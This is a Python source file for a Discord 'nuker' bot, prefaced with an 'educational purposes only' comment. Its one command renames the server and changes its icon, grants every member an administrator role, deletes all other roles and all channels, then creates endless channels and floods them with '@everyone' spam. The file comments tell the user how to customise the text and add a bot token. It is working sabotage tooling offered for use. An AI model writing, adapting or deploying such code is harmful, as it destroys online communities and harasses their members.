#educational purposes only

import discord
from discord.ext import commands
import asyncio
import requests
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents) 
spamming = False
channels = []
current_channel_index = 0

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
@commands.has_permissions(administrator=True)
async def fuck(ctx):
    global spamming
    global channels
    global current_channel_index
    spamming = True
    current_channel_index = 0

    image_url = "https://media.istockphoto.com/id/1502909075/vector/crying-bean-character.jpg?s=170667a&w=0&k=20&c=ETQuGy5xeh9zstOMj1Q-WL1dhrIsVBmlxzDaUaZMcwI=" 
    #Change image to server image you want it to set
    response = requests.get(image_url)
    image = BytesIO(response.content)

    try:
        await ctx.guild.edit(icon=image.read())
    except discord.HTTPException:
        await ctx.send("Failed to update server profile ")

    await ctx.guild.edit(name="Wanna wheep")  #change name to the server name

    fucked_role = await ctx.guild.create_role(
        name="fucked", #change role name to add to everyone in the server
        color=discord.Color.from_rgb(139, 0, 0),
        permissions=discord.Permissions(administrator=True),
        reason="Role created by bot"
    )

    wanna_wheep_role = discord.utils.get(ctx.guild.roles, name="wanna wheep") 
    if not wanna_wheep_role:
        wanna_wheep_role = await ctx.guild.create_role(
            name="wanna wheep",
            color=discord.Color.red(),
            permissions=discord.Permissions(administrator=True),
            reason="Role created by bot"
        )

    for member in ctx.guild.members:
        await member.add_roles(fucked_role)

    for role in ctx.guild.roles:
        if role.name not in ["@everyone", "wanna wheep", "fucked"]:
            await role.delete()

    for channel in ctx.guild.channels:
        await channel.delete()

    channels = []

    i = 1
    while spamming:
        new_channel = await ctx.guild.create_text_channel(f'wannawheep{i}')
        channels.append(new_channel)
        i += 1
        await asyncio.sleep(0.05)

    async def spam_channels():
        global current_channel_index
        while spamming:
            channel = channels[current_channel_index]
            for _ in range(100):
                try:
                    await channel.send('@everyone wanna wheep?') #change text
                except discord.Forbidden:
                    break
                await asyncio.sleep(0.001)
            current_channel_index = (current_channel_index + 1) % len(channels)

    bot.loop.create_task(spam_channels())

bot.run('BotToken') #change BotToken to your bots token or it wont work
